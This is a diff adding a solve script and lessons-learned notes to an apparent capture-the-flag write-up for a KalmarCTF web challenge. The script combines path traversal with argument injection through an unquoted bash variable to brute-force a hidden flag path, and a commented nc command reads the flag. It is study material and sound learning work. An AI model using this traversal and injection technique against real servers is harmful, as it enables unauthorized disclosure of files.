@@ -250,3 +250,40 @@ receive_request
 handle_request
 ```
 
+some solve script from maple3142
+
+```
+from pwn import remote, context
+import string
+from concurrent.futures import ThreadPoolExecutor
+
+
+def guess(prefix):
+    context.log_level = "error"
+    io = remote("chal-kalmarc.tf", 8080)
+    io.send(
+        f"GET /assets/../../../../ -f\ /app/static/assets/{prefix}*/flag.txt\ -a\ x\r\n\r\n".encode()
+    )
+    return b"400 Bad Request" in io.recvall()
+
+
+chrs = string.hexdigits
+prefix = ""
+while len(prefix) < 32:
+    with ThreadPoolExecutor() as executor:
+        futures = [executor.submit(guess, prefix + c) for c in chrs]
+        for fut, c in zip(futures, chrs):
+            if fut.result():
+                prefix += c
+                print(prefix)
+                break
+# printf 'GET /assets/../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt HTTP/1.0\r\n\r\n' | nc chal-kalmarc.tf 8080
+```
+## --WHAT I'VE LEARNED--
+- the vuln: Local File Disclosure through url
+- another vuln: unquoted var in source code `if [ $protocol != 'HTTP/1.0' ] && [ $protocol != 'HTTP/1.1' ]; then abort 'Invalid protocol' fi` can lead to glob and word splitting in bash
+- glob and word splitting in bash
+- `/proc/1/cmdline` to read local files
+-------------------------------
+
+
